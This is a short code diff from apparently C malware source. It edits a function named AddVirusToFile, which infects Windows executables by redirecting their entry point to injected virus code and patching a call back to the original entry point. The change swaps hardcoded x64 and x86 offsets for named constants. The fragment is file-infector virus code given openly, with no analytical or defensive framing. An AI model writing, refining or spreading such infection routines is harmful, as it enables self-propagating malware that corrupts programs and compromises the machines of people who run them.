@@ -28,9 +28,9 @@ void WINAPI AddVirusToFile(PVOID file_data, DWORD file_size, PDATA data, LPDWORD
         DWORD entry_point_64bit = *(DWORD *)&section_data_global[4]; //0x28F0;
         SetEntryPoint(file_data, virus_va_in_target + entry_point_64bit);
         *(DWORD*)((unsigned char*)file_data + virus_ra_in_target + 
-                                            entry_point_64bit + 0x55 //0x2945//
+                                            entry_point_64bit + DISTANCE_VIRUS_MAIN_TO_SECOND_BYTE_OF_CALL_EMPTY_X64
                 ) = target_entry_point - (virus_va_in_target + 
-                                            entry_point_64bit + 0x59 // 0x2949
+                                            entry_point_64bit + DISTANCE_VIRUS_MAIN_TO_SECOND_BYTE_OF_CALL_EMPTY_X64 + sizeof(DWORD)
                                 ); 
     }
     else
@@ -38,9 +38,9 @@ void WINAPI AddVirusToFile(PVOID file_data, DWORD file_size, PDATA data, LPDWORD
         DWORD entry_point_32bit = *(DWORD *)&section_data_global[0]; //0xca0;
         SetEntryPoint(file_data, virus_va_in_target + entry_point_32bit);
         *(DWORD*)((unsigned char*)file_data + virus_ra_in_target + 
-                                            entry_point_32bit + 0x3c //0xcdc
+                                            entry_point_32bit + DISTANCE_VIRUS_MAIN_TO_SECOND_BYTE_OF_CALL_EMPTY_X86
                 ) = target_entry_point - (virus_va_in_target + 
-                                            entry_point_32bit + 0x40 // 0xce0
+                                            entry_point_32bit + DISTANCE_VIRUS_MAIN_TO_SECOND_BYTE_OF_CALL_EMPTY_X86 + sizeof(DWORD)
                                         );
     }
 
